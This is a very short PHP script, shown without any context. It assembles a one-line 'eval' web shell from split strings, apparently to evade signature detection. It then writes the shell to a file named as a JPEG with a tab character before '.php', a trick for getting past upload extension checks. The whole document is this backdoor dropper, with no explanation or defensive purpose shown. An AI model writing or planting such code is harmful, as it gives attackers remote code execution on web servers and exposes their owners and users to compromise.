<?php
$a="<?php @eval("."$"."_POST"."[rcoil]);?>";
file_put_contents($webpath ."test.jpg".chr(9).".php", $a);
?> 